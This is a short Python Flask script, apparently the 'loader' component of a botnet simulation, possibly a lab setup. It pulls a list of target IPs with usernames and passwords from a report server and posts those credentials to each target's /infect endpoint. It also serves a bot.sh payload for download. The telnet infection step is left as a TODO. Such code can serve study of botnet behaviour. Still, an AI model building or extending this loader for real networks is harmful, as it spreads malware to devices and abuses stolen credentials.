# loader.py
from flask import Flask, send_file
import requests, time, os

app = Flask(__name__)


@app.route("/infectAll", methods=["POST"])
def infect_all():
    REPORT_SERVER = "http://report:5000/list"
    response = requests.get(REPORT_SERVER)
    response.raise_for_status()
    
    data = response.json()
    targets = data.get("data",[])

    for target in targets:
        auth_ip = target.get("ip")
        auth_user = target.get("user")
        auth_pass = target.get("pass")
        
        try:
            print(f"Trying to infect {target}\n", flush = True)
            time.sleep(0.3)
            
            # TODO telnet connection
            
            url = f"http://{auth_ip}:8000/infect"
            requests.post(url, json={"ip": auth_ip, "user": auth_user,"pass": auth_pass})
            
        except Exception as e:
            print(f"[-] Failed {auth_ip}: {e}\n", flush = True)
            
        time.sleep(1)
    return f"Infected: {len(targets)} targets\n"
    
@app.route("/bot.sh")
def send_bot():
    print("Sending the bot", flush = True)
    return send_file("bot.sh", mimetype="text/plain")

app.run(host="0.0.0.0", port=5001,debug = True)



